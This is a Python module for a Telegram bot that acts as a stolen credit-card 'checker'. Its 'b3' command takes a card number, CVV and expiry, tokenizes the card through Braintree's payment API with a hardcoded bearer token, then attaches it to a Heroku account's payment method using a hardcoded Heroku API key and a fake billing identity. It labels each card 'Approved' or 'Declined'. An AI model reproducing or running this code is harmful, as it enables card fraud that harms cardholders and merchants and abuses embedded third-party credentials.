from urllib import response
from requests import get, patch, post
from telethon import Button

from ._handler import newMsg

B3_MESSAGE = """
**B3/Auth** {emoji}
**Credit Card Number:** `{card_number}`
**CVC:** `{cvc}`
**Expiration:** `{exp_mo}/{exp_year}`
**Status:** __**{status}**__
**Message:** `{message}`
"""


@newMsg(pattern="b3")
async def _stripe(e):
    try:
        arg = e.text.split(" ", 1)[1]
    except IndexError:
        await e.reply("`Usage: .stripe <card number> <cvc> <exp>`")
        return
    message = await e.reply("`Processing...`")
    cc, exp_mo, exp_year, cvv = arg.split("|", 3)
    token = tokenize_card(cc.strip(), cvv.strip(),
                          exp_mo.strip(), exp_year.strip())
    if token is None:
        await message.edit("`Invalid card details.`")
        return
    response = b3_auth_heroku(token)
    status, msg, emoji = b3_response_parser(response)
    await message.edit(B3_MESSAGE.format(
        emoji=emoji,
        card_number=cc,
        cvc=cvv,
        exp_mo=exp_mo,
        exp_year=exp_year,
        status=status,
        message=msg
    ))


def b3_auth_heroku(token):
    headers = {
        "authority": "api.heroku.com",
        "accept": "application/vnd.heroku+json; version=3",
        "authorization": "Bearer cf0ff874-b73c-4732-a7c5-9524acb07d36",
    }

    data = {
        "address_1": "401 AK St.",
        "address_2": None,
        "city": "Chicago",
        "country": "US",
        "first_name": "Jenna M ",
        "last_name": "Ortega",
        "postal_code": "10800",
        "state": "IL",
        "other": None,
        "nonce": token,
        "device_data": '{"device_session_id":"1f5d4e42701386875b8fe252e96bab97","fraud_merchant_id":"604019","correlation_id":"c1769c09ffdd118cdbc763507964b026"}',
    }

    response = patch(
        "https://api.heroku.com/account/payment-method", headers=headers, json=data
    )
    return response.json()


def tokenize_card(card_number, cvc, exp_mo, exp_year):
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2NTkxNzYwNzgsImp0aSI6IjY0M2Y0YzE1LWNiNmMtNDY1Ny1hOWQ5LTUxNTI2MTQzMDlhZSIsInN1YiI6IjM2OTZzNzczeWRjMnoycjMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjM2OTZzNzczeWRjMnoycjMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.-FyX5EeRKk2j1W5gUEzJXi24RDymCKMyWep9CLqIPyQt63ZggmrbB_cYwovnAaMkxM7LjkWUORERtOmYTNDWxg",
        "Braintree-Version": "2018-05-10",
    }

    data = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": "94c4a395-385a-4ba3-9cad-7ca465cb1c21",
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": card_number,
                    "expirationMonth": exp_mo,
                    "expirationYear": exp_year,
                    "cvv": cvc,
                },
                "options": {
                    "validate": False,
                },
            },
        },
        "operationName": "TokenizeCreditCard",
    }

    response = post(
        "https://payments.braintree-api.com/graphql", headers=headers, json=data
    )
    try:
        return response.json()["data"]["tokenizeCreditCard"]["token"]
    except:
        return None


def b3_response_parser(resp):
    DEAD = "❌"
    ALIVE = "✅"
    if resp.get("id", "") == "invalid_params":
        return "Declined", resp.get("message", "-"), DEAD
    return "Approved", resp.get("message", "-"), ALIVE
